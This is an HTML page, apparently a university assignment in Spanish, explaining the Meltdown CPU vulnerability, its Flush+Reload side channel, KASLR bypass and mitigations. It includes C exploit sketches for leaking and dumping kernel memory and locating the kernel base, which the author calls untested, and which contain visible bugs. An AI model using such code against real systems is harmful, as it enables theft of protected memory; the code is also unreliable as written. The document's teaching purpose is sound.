@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>-</title>
+  <style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+
+ul.task-list[class]{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+font-size: inherit;
+width: 0.8em;
+margin: 0 0.8em 0.2em -1.6em;
+vertical-align: middle;
+}
+</style>
+  <style type="text/css">@font-face {
+font-family: fira-sans;
+src: local("FiraSans-Regular");
+}
+@font-face {
+font-family: fira-mono;
+src: local("FiraMono-Regular");
+}
+@font-face {
+font-family: color-emoji;
+src: local("Noto Color Emoji"), local("Apple Color Emoji"), local("Segoe UI Emoji"), local("Segoe UI Symbol");
+}
+:root {
+--text-color: #24292e;
+--background-color: #ffffff;
+--alt-background-color: #f6f8fa;
+--link-color: #0366d6;
+--blockquote-text-color: #6a737d;
+--blockquote-border-color: #dfe2e5;
+--header-border-color: #eaecef;
+--hr-background-color: #e1e4e8;
+--table-tr-border-color: #c6cbd1;
+--table-td-border-color: #dfe2e5;
+--kbd-text-color: #444d56;
+--kbd-background-color: #fafbfc;
+--kbd-border-color: #c6cbd1;
+--kbd-shadow-color: #959da5;
+}
+* {
+box-sizing: border-box;
+}
+html {
+font-size: 16px;
+}
+body {
+color: var(--text-color);
+background-color: var(--background-color);
+font-family: "Fira Sans", fira-sans, sans-serif, color-emoji;
+line-height: 1.5;
+word-wrap: break-word;
+max-width: 980px;
+margin: auto;
+margin-top: 60px;
+padding: 4em;
+}
+@media screen and (max-width: 799px) {
+html {
+font-size: 14px;
+}
+body {
+padding: 1em;
+}
+}
+@media screen and (min-width: 1280px) {
+html {
+font-size: 18px;
+}
+}
+a {
+background-color: transparent;
+color: var(--link-color);
+text-decoration: none;
+}
+a:active,
+a:hover {
+outline-width: 0;
+}
+a:hover {
+text-decoration: underline;
+}
+strong {
+font-weight: bold;
+}
+img {
+border-style: none;
+}
+hr {
+box-sizing: content-box;
+height: 0.25em;
+padding: 0;
+margin: 1.5em 0;
+overflow: hidden;
+background-color: var(--hr-background-color);
+border: 0;
+}
+hr::before {
+display: table;
+content: "";
+}
+hr::after {
+display: table;
+clear: both;
+content: "";
+}
+input {
+font-family: inherit;
+font-size: inherit;
+line-height: inherit;
+margin: 0;
+overflow: visible;
+}
+[type="checkbox"] {
+box-sizing: border-box;
+padding: 0;
+}
+table {
+border-spacing: 0;
+border-collapse: collapse;
+}
+td,
+th {
+padding: 0;
+}
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+font-weight: bold;
+margin: 0;
+}
+h1 {
+font-size: 2em;
+}
+h2 {
+font-size: 1.5em;
+}
+h3 {
+font-size: 1.25em;
+}
+h4 {
+font-size: 1em;
+}
+h5 {
+font-size: 0.875em;
+}
+h6 {
+font-size: 0.85em;
+}
+p {
+margin-top: 0;
+margin-bottom: 0.625em;
+}
+blockquote {
+margin: 0;
+}
+ul,
+ol {
+padding-left: 0;
+margin-top: 0;
+margin-bottom: 0;
+}
+ol ol,
+ul ol {
+list-style-type: lower-roman;
+}
+ul ul ol,
+ul ol ol,
+ol ul ol,
+ol ol ol {
+list-style-type: lower-alpha;
+}
+dd {
+margin-left: 0;
+}
+code,
+kbd,
+pre {
+font-family: "Fira Mono", fira-mono, monospace, color-emoji;
+font-size: 1em;
+word-wrap: normal;
+}
+code {
+border-radius: 0.1875em;
+font-size: 0.85em;
+padding: 0.2em 0.4em;
+margin: 0;
+}
+pre {
+margin-top: 0;
+margin-bottom: 0;
+font-size: 0.75em;
+}
+pre>code {
+padding: 0;
+margin: 0;
+font-size: 1em;
+word-break: normal;
+white-space: pre;
+background: transparent;
+border: 0;
+}
+.highlight {
+margin-bottom: 1em;
+}
+.highlight pre {
+margin-bottom: 0;
+word-break: normal;
+}
+.highlight pre,
+pre {
+padding: 1em;
+overflow: auto;
+font-size: 0.85em;
+line-height: 1.5;
+background-color: var(--alt-background-color);
+border-radius: 0.1875em;
+}
+pre code {
+background-color: transparent;
+border: 0;
+display: inline;
+padding: 0;
+margin: 0;
+overflow: visible;
+line-height: inherit;
+word-wrap: normal;
+}
+.pl-0 {
+padding-left: 0 !important;
+}
+.pl-1 {
+padding-left: 0.25em !important;
+}
+.pl-2 {
+padding-left: 0.5em !important;
+}
+.pl-3 {
+padding-left: 1em !important;
+}
+.pl-4 {
+padding-left: 1.5em !important;
+}
+.pl-5 {
+padding-left: 2em !important;
+}
+.pl-6 {
+padding-left: 2.5em !important;
+}
+.markdown-body::before {
+display: table;
+content: "";
+}
+.markdown-body::after {
+display: table;
+clear: both;
+content: "";
+}
+.markdown-body>*:first-child {
+margin-top: 0 !important;
+}
+.markdown-body>*:last-child {
+margin-bottom: 0 !important;
+}
+a:not([href]) {
+color: inherit;
+text-decoration: none;
+}
+.anchor {
+float: left;
+padding-right: 0.25em;
+margin-left: -1.25em;
+line-height: 1;
+}
+.anchor:focus {
+outline: none;
+}
+p,
+blockquote,
+ul,
+ol,
+dl,
+table,
+pre {
+margin-top: 0;
+margin-bottom: 1em;
+}
+blockquote {
+padding: 0 1em;
+color: var(--blockquote-text-color);
+border-left: 0.25em solid var(--blockquote-border-color);
+}
+blockquote>:first-child {
+margin-top: 0;
+}
+blockquote>:last-child {
+margin-bottom: 0;
+}
+kbd {
+display: inline-block;
+padding: 0.1875em 0.3125em;
+font-size: 0.6875em;
+line-height: 1;
+color: var(--kbd-text-color);
+vertical-align: middle;
+background-color: var(--kbd-background-color);
+border: solid 1px var(--kbd-border-color);
+border-bottom-color: var(--kbd-shadow-color);
+border-radius: 3px;
+box-shadow: inset 0 -1px 0 var(--kbd-shadow-color);;
+}
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+margin-top: 1.5em;
+margin-bottom: 1em;
+font-weight: bold;
+line-height: 1.25;
+}
+h1:hover .anchor,
+h2:hover .anchor,
+h3:hover .anchor,
+h4:hover .anchor,
+h5:hover .anchor,
+h6:hover .anchor {
+text-decoration: none;
+}
+h1 {
+padding-bottom: 0.3em;
+font-size: 2em;
+border-bottom: 1px solid var(--header-border-color);
+}
+h2 {
+padding-bottom: 0.3em;
+font-size: 1.5em;
+border-bottom: 1px solid var(--header-border-color);
+}
+h3 {
+font-size: 1.25em;
+}
+h4 {
+font-size: 1em;
+}
+h5 {
+font-size: 0.875em;
+}
+h6 {
+font-size: 0.85em;
+opacity: 0.67;
+}
+ul,
+ol {
+padding-left: 2em;
+}
+ul ul,
+ul ol,
+ol ol,
+ol ul {
+margin-top: 0;
+margin-bottom: 0;
+}
+li {
+overflow-wrap: break-word;
+}
+li>p {
+margin-top: 1em;
+}
+li+li {
+margin-top: 0.25em;
+}
+dl {
+padding: 0;
+}
+dl dt {
+padding: 0;
+margin-top: 1em;
+font-size: 1em;
+font-style: italic;
+font-weight: bold;
+}
+dl dd {
+padding: 0 1em;
+margin-bottom: 1em;
+}
+table {
+display: block;
+width: 100%;
+overflow: auto;
+}
+table th {
+font-weight: bold;
+}
+table th,
+table td {
+padding: 0.375em 0.8125em;
+border: 1px solid var(--table-td-border-color);
+}
+table tr {
+background-color: var(--background-color);
+border-top: 1px solid var(--table-tr-border-color);
+}
+table tr:nth-child(2n) {
+background-color: var(--alt-background-color);
+}
+img {
+max-width: 100%;
+box-sizing: content-box;
+}
+img[align=right] {
+padding-left: 1.25em;
+}
+img[align=left] {
+padding-right: 1.25em;
+}
+.task-list-item {
+list-style-type: none;
+}
+.task-list-item+.task-list-item {
+margin-top: 0.1875em;
+}
+.task-list-item input {
+margin: 0 0.2em 0.25em -1.6em;
+vertical-align: middle;
+}
+:root {
+--text-color: rgba(0, 0, 0, 0.8);
+--background-color: #f5f5f5;
+--alt-background-color: #eeeeee;
+--link-color: #0d71de;
+--blockquote-text-color: #747e85;
+--blockquote-border-color: #d6d8da;
+--header-border-color: #e1e2e4;
+--hr-background-color: #d8dadd;
+--table-tr-border-color: #bdc1c6;
+--table-td-border-color: #d6d8da;
+--kbd-text-color: #4e585e;
+--kbd-background-color: #f1f1f1;
+--kbd-border-color: #bdc1c6;
+--kbd-shadow-color: #8c939a;
+}
+@media (prefers-color-scheme: dark) {
+:root {
+--text-color: #eeeeee;
+--background-color: #282828;
+--alt-background-color: #3a3a3a;
+--link-color: #b5daff;
+--blockquote-text-color: #a8a8a6;
+--blockquote-border-color: #525252;
+--header-border-color: #474747;
+--hr-background-color: #505050;
+--table-tr-border-color: #696969;
+--table-td-border-color: #525252;
+--kbd-text-color: #cececc;
+--kbd-background-color: #3c3c3c;
+--kbd-border-color: #696969;
+--kbd-shadow-color: #979797;
+}
+}
+</style>
+</head>
+<body>
+<h1 id="meltdown">Meltdown</h1>
+<p>Por: Martín Jiménez</p>
+<p>Meltdown es una vulnerabilidad crítica de hardware que afecta principalmente a procesadores Intel, descubierta en 2017 de forma independiente por Jann Horn de Google Project Zero, y por investigadores de Cyberus Technology y la Universidad Técnica de Graz y divulgada publicamente en enero de 2018. La vulnerabilidad permite violar el aislamiento de memoria, un principio fundamental para la seguridad de los sistemas informaticos. Meltdown explota efectos colaterales de la ejecución fuera de orden para lograr leer direcciones arbitrarias de memoria pertenecientes al kernel. El ataque es independiente del sistema operativo. Se le ha asignado el identificador CVE-2017-5754 con un score de 5,6.</p>
+<h2 id="ejecución-fuera-de-orden">Ejecución fuera de orden</h2>
+<p>La ejecución fuera de orden es una tecnica de optimización que permite maximizar la utilidad de una CPU. En vez de ejecutar las instrucciones de forma estrictamente secuencial, la CPU las ejecuta tan pronto como los recursos necesarios esten disponibles. De esta forma, se minimiza la cantidad de ciclos que el procesador espera para tener disponibles los datos necesarios.</p>
+<p>Además, como normalmente las CPUs no ejecutan flujos de algoritmos lineales, están dotadas de branch prediction units, cuya finalidad es hacer una predicción educada sobre la siguiente instrucción que va a ser ejecutada. Los branch predictors intentar predecir la dirección que el programa va a seguir antes de que la condición que lo determina sea evaluada.</p>
+<p>Las instrucciones del branch predicho seran ejecutadas siempre y cuando no tengan dependencias y sus resulatados se podran usar si la predicción era correcta.</p>
+<p>En caso de esta fuera incorrecta, la CPU volvera a un estado previo correcto. A las instrucciones que han sido ejecutadas se les llama instrucciones transitorias y han podido dejar cambios medibles en la microarquitectura (por ejemplo, en la cache).</p>
+<p>Existen diferentes enfoques para predecir una bifurcación. La predicción estatica toma la decisión basandose unicamente en la instrucción. La predicción dinamica recoge estadisticas en tiempo de ejecución para realizar la predicción. Tambien existen ideas, aunque todavia no comercializadas de hacer la predicción usando redes neuronales.</p>
+<h2 id="virtualización-de-memoria">Virtualización de memoria</h2>
+<p>La virtualización de la memoria es una técnica utilizada por los sistemas operativos modernos para abstraer la memoria física del sistema y proporcionar a cada proceso su propio espacio de direcciones virtuales, como si tuviera acceso a toda la memoria disponible. Esto soluciona problemas de fragmentación de memoria, accesos no autorizados a direcciones de otros procesos, etc.</p>
+<p>Para lograrlo, se usa la Unidad de Gestión de Memoria, que se encarga de traducir las direcciones virtuales que usan los procesos, a las fisicas en las que realmente se encuentran los datos.</p>
+<p>Para mejorar el rendimiento, muchos sistemas operativos mapean las direcciones fisicas del kernel en la memoria virtual de todos los procesos. Gracias a ello, cuando un proceso requiere acceso a alguna dirección del kernel (por ejemplo, realiza una syscall), la CPU no necesita cambiar por completo el contexto de la memoria.</p>
+<p>La Unidad de Gestión de Memoria se encarga de impedir accesos no autorizados a direcciones kernel por parte del proceso usando un bit de privilegio que indica si la pagina de memoria es accesible desde modo usuario o solo desde modo kernel.</p>
+<p>Los creadores de Meltdown se dieron cuenta de que a pesar de ello, la CPU podia acceder especulativamente a direcciones de memoria asignadas al kernel antes de validar permisos.</p>
+<h2 id="exfiltración">Exfiltración</h2>
+<p>Como hemos visto, la CPU puede acceder especulativamente a direcciones de memoria asignadas al kernel antes de validar permisos y además, las instrucciones transitorias pueden dejar cambios medibles en la microarquitectura.</p>
+<p>Esto nos permite exfiltrar la información leida especulativamente mediante tecnicas de analisis de canal lateral, como Flush+Reload.</p>
+<p>Flush+Reload permite detectar si una determinada línea de caché ha sido cargada por la CPU durante la ejecución especulativa. Consiste en vaciar una línea de caché específica para asegurarse de que no esté presente, y luego medir el tiempo que se tarda en acceder a esa misma línea tras la ejecución especulativa. Si el acceso es rápido, indica que la línea fue recargada en la caché, lo que revela que el dato asociado fue leído especulativamente.</p>
+<p>Así, combinando esta técnica con la capacidad de la CPU para acceder a memoria del kernel antes de validar permisos, podemos exfiltrar información sensible almacenada en el espacio de memoria protegido, violando el aislamiento esperado entre espacio usuario y kernel.</p>
+<h2 id="bias-hacia-el-0">Bias hacia el 0</h2>
+<p>Los investigadores que descubrieron la vulnerabilidad, se dieron cuenta de que la lectura ilegal realizada de forma especulativa devolvia 0 una cantidad considerable de veces. Esto podria deberse bien a alguna comprobacion fallida de permisos, o al uso de un valor especulativo.</p>
+<p>La tendencia a devolver 0s varía segun la maquina en la que se ejecute y su configuración de software.</p>
+<p>Debido a esta tendencia, a la hora de obtener el secreto leido, si se ha obtenido un 0, hay que volver a realizar el proceso. La cantidad máxima de reintentos antes de leer un valor diferente a 0 es un parametro de optimización que influye directamente en el rendimiento del ataque.</p>
+<p>Además, se puede evitar comprobar si hay un hit para i=0, ya que no aporta información. Una vez se haya reintentado la cantidad de veces indicada, se asumira que es valor es 0.</p>
+<h2 id="lidiando-con-kaslr">Lidiando con KASLR</h2>
+<p>En 2013 se introdujo KASLR (Kernel Address Space Layout Randomization) al kernel de Linux y en 2017 se añadio por defecto en la versión 4.12.</p>
+<p>Esta medida de seguridad asigna una dirección aleatoria al kernel cada vez que se arranca el sistema. Sin embargo, la randomización esta limitada a 40 bits. Si asumimos que la victima tiene 8GB de RAM, basta con comprobar en pasos de 8GB. Esto nos permite realizar la busqueda en un máximo de 128 comprobaciones y podemos saltarnos KASLR en poco tiempo.</p>
+<h2 id="análisis-del-exploit">Análisis del exploit</h2>
+<p>En esta sección realizo un análisis del exploit presentado en eGela, al que le he añadido mas comentarios. Cabe mencionar que este exploit es orientativo y que no tiene en cuenta algunas cosas mencionadas anteriormente.</p>
+<pre><code>// Input:
+// uint8_t *address -&gt; dirección a filtrar
+// uint8_t *probe_array -&gt; gran array controlado en espacio de usuario
+// Output:
+// uint8_t leaked_value -&gt; byte recuperado
+
+void meltdown_attack(uint8_t *address, uint8_t *probe_array) {
+    setup_signal_handler(); // Configura el handler de SIGSEGV
+
+    while (true) {
+        // Vacía probe_array de la caché
+        // Hace el flush de Flush+Reload
+        for (int i = 0; i &lt; 256; i++) {
+            clflush(&amp;probe_array[i * 4096]);
+        }
+
+        // Una &quot;valla&quot; que asegura que todas las instrucciones anteriores han sido ejecutadas 
+        _mm_mfence(); // Asegura el orden de las operaciones de memoria
+
+        // Intentar leer el secreto especulativamente
+
+        // Cuando salte la excepción, la ejecucion volvera aqui y setjmp(env) valdra 1,
+        // por lo que saldra del if
+        if (setjmp(env) == 0) { // Guarda el contexto por si hay fallo
+            uint8_t value = *address;               // Acceso ilegal (segfault)
+            // Multiplicamos por tamaño de pagina para evitar falsos positivos por prefetching
+            uint8_t offset = value * 4096;
+            // Accedemos al indice offset para luego poder recuperar su valor          
+            volatile uint8_t temp = probe_array[offset]; // Provoca carga en caché
+            
+        }
+
+        // Tras la excepción, detectar qué página fue cacheada
+        for (int i = 0; i &lt; 256; i++) {
+            // Guarda la &quot;hora&quot;
+            uint64_t t1 = rdtsc();
+            // Accede al i-esimo valor del array
+            // Multiplicado por tamaño de pagina para evitar falso positivo por prefetching
+            uint8_t dummy = probe_array[i * 4096];
+            // Calculamos cuanto tiempo ha tardado en leer el valor
+            uint64_t t2 = rdtsc() - t1;
+
+            // Si ha tardado menos que CACHE_HIT_THRESHOLD, asumimos que estaba en cache
+            // Luego inferimos el valor que leido por las intrucciones transitorias es i
+            if (t2 &lt; CACHE_HIT_THRESHOLD) {
+                leaked_value = (uint8_t)i;
+                return;
+            }
+        }
+    }
+}</code></pre>
+<h2 id="mitigaciones">Mitigaciones</h2>
+<p>La raiz de la vulnerabilidad reside en el hardware, por lo que tuvieron que crear mitigaciones a nivel de software hasta que fue posible sacar al mercado nuevo hardware.</p>
+<p>El paper propone KAISER, que consiste en no mapear el kernel en el espacio del usuario. Se asegura de que no haya un mapeo valido al espacio del kernel. Sin embargo, esto reduce el rendimiento. La implementación de linux se llama KPTI (Kernel Page Table Isolation).</p>
+<p>CPUs mas modernas tienen protecciones a nivel de hardware tales como la deshabilitación de acceso especulativo a memoria protegida.</p>
+<h2 id="diseño-de-un-flujo-de-explotación-adaptado-a-un-sistema-real">Diseño de un flujo de explotación adaptado a un sistema real</h2>
+<p>Ya que hoy en dia los parches a nivel de software estan aplicados, podriamos empezar comprobando si el sistema los tiene activos y en caso afirmativo, intentar desactivarlos (suponiendo que somos root). No tengo en cuenta la posibilidad de que el hardware no sea vulnerable porque si ese es el caso no hay nada que podamos hacer.</p>
+<p>La funcion meltdown_attack es el exploit de eGela añadiendole la mejora de la tendencia hacia el 0.</p>
+<pre><code>void meltdown_attack(uint8_t *address, uint8_t *probe_array, int zero_retry) {
+    setup_signal_handler(); // Configura el handler de SIGSEGV
+
+    for (int j = 0; j &lt; zero_rety; j++) {
+        // Hace el flush de Flush+Reload
+        for (int i = 0; i &lt; 256; i++) {
+            clflush(&amp;probe_array[i * 4096]);
+        }
+
+        // Una &quot;valla&quot; que asegura que todas las instrucciones anteriores han sido ejecutadas 
+        _mm_mfence(); // Asegura el orden de las operaciones de memoria
+
+        // Intentar leer el secreto especulativamente
+
+        // Cuando salte la excepción, la ejecucion volvera aqui y setjmp(env) valdra 1,
+        // por lo que saldra del if
+        if (setjmp(env) == 0) { // Guarda el contexto por si hay fallo
+            uint8_t value = *address;               // Acceso ilegal (segfault)
+            // Multiplicamos por tamaño de pagina para evitar falsos positivos por prefetching
+            uint8_t offset = value * 4096;
+            // Accedemos al indice offset para luego poder recuperar su valor          
+            volatile uint8_t temp = probe_array[offset]; // Provoca carga en caché
+            
+        }
+
+        // Tras la excepción, detectar qué página fue cacheada
+        for (int i = 1; i &lt; 256; i++) {
+            // Guarda la &quot;hora&quot;
+            uint64_t t1 = rdtsc();
+            // Accede al i-esimo valor del array
+            // Multiplicado por tamaño de pagina para evitar falso positivo por prefetching
+            uint8_t dummy = probe_array[i * 4096];
+            // Calculamos cuanto tiempo ha tardado en leer el valor
+            uint64_t t2 = rdtsc() - t1;
+
+            // Si ha tardado menos que CACHE_HIT_THRESHOLD, asumimos que estaba en cache
+            // Luego inferimos el valor que leido por las intrucciones transitorias es i
+            if (t2 &lt; CACHE_HIT_THRESHOLD) {
+                leaked_value = (uint8_t)i;
+                return;
+            }
+    }
+    return (uint8_t)0;
+}</code></pre>
+<p>La función meltdown_dump lee n direcciones a partir del inicio.</p>
+<pre><code>// Hace un dump de n bytes a partir de una dirección dada
+void meltdown_dump(uint8_t *start_addr, int n, uint8_t *output_buffer) {
+    for (int i = 0; i &lt; n; i++) {
+        uint8_t leaked = meltdown_attack(start_addr + i, probe_array, 20);
+        output_buffer[i] = leaked;
+        printf(&quot;Byte %d: 0x%02x (%c)\n&quot;, i, leaked, (leaked &gt;= 32 &amp;&amp; leaked &lt; 127) ? leaked : &#39;.&#39;);
+    }
+}</code></pre>
+<p>Si KASLR esta activo, podemos iterar a traves de las direcciones i * step GB, donde step es la capacidad de la memoria RAM de la victima. De esta forma, encontraremos el offset y sabremos en que direccion esta mapeado el kernel.</p>
+<pre><code>uint8_t find_kernel_base(uint8_t *probe_array, size_t step) {
+    uint64_t base = 0xffff800000000000; // Comienzo típico del espacio kernel en x86_64
+    uint64_t max  = 0xffffc00000000000; // Un límite alto razonable
+    
+
+    printf(&quot;Buscando base del kernel...\n&quot;);
+
+    for (uint64_t addr = base; addr &lt; max; addr += step) {
+        uint8_t *ptr = (uint8_t *)addr;
+        meltdown_attack(ptr, probe_array, 1); // Usa solo 1 intento por dirección
+        if (leaked_value != 0) { // Si se filtró algo distinto de 0
+            printf(&quot;Posible base del kernel encontrada: 0x%lx (valor: 0x%02x)\n&quot;, addr, leaked_value);
+            return (uint8_t *)addr;
+        }
+    }
+
+    printf(&quot;No se encontró la base del kernel\n&quot;);
+    return NULL;
+}</code></pre>
+<p>En el main buscamos la dirección en la que empieza el kernel y en caso de encontrarlo, realizamos un dump.</p>
+<pre><code>int main() {
+    uint8_t *kernel_base = find_kernel_base(probe_array);
+    if (kernel_base == NULL) {
+        printf(&quot;No se puede continuar sin base del kernel.\n&quot;);
+        return 1;
+    }
+
+    printf(&quot;Dump de memoria desde 0x%p:\n&quot;, kernel_base);
+    uint8_t buffer[32] = {0};
+    meltdown_dump(kernel_base, 32, buffer);
+
+    // Hacer algo con el buffer (guardar en un archivo, ...)
+
+    return 0;
+}</code></pre>
+<p>No he conseguido tener acceso a una maquina vulnerable, por lo que no he podido comprobar el (no) funcionamiento del codigo que he presentado. No he podido realizar los ajustes que seguramente necesita, por lo que el codigo ha de entenderse como el diseño a alto nivel de lo que podria llegar a ser un exploit. Por estas razones no he subido el codigo a github.</p>
+</body>
+</html>
